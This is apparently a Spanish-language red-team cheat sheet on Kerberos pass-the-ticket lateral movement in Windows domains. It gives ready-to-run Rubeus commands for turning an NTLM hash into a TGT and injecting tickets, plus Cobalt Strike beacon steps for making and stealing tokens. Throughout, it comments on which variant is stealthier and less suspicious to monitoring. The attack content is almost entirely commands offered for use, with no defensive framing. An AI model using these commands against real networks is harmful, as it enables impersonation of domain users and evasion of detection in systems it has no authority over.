---
tags: [lateral-movement, kerberos, ticket, rubeus, ptt]
status: done
platform: windows
---

# Pass The Ticket

> Inyectar tickets Kerberos (TGT o TGS) para autenticarse como otro usuario.

---

## Overpass-the-Hash (Hash → TGT)

Convertir un hash NTLM en un TGT Kerberos. Evita el tráfico NTLM en la red (más sigiloso en entornos con monitorización de NTLM).

```
# Rubeus — solicitar TGT usando el hash NTLM
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:<NTLM_HASH> /nowrap /ptt
```

**Qué ocurre:** Rubeus envía una petición AS-REQ al KDC usando el hash como material de cifrado → obtiene un TGT válido → lo inyecta en la sesión actual.

---

## Inyectar TGT Existente

### Método 1 — make_token + kerberos_ticket_use (simple)

```
# En Cobalt Strike
beacon> make_token DOMAIN\usuario FakePassword
beacon> kerberos_ticket_use C:\ruta\ticket.kirbi
```

**Limitación:** make_token crea un proceso de tipo Logon Type 9 (NewCredentials). El ticket se inyecta en ese contexto.

### Método 2 — Rubeus createnetonly + ptt + steal_token (más limpio)

```
# 1. Crear proceso aislado con contexto de red (sin credenciales reales)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:admin /password:FakePass /ticket:<base64_TGT>

# 2. El comando devuelve un PID con el ticket inyectado
# 3. Robar token de ese proceso desde CS
beacon> steal_token <PID>

# 4. Ahora actuamos como ese usuario con su TGT válido
# 5. Limpiar
beacon> rev2self
beacon> kill <PID>
```

**Por qué es mejor:** El proceso creado tiene Logon Type 2 (Interactive), no Type 9. Menos sospechoso.

---

## TGS Directo (ya tienes el service ticket)

Si tienes un TGS para un servicio específico:
```
Rubeus.exe ptt /ticket:<base64_TGS>
# Ahora puedes acceder al servicio directamente
```

---

## Verificar Tickets en Sesión

```
# Nativo Windows
klist

# Rubeus
Rubeus.exe triage
```

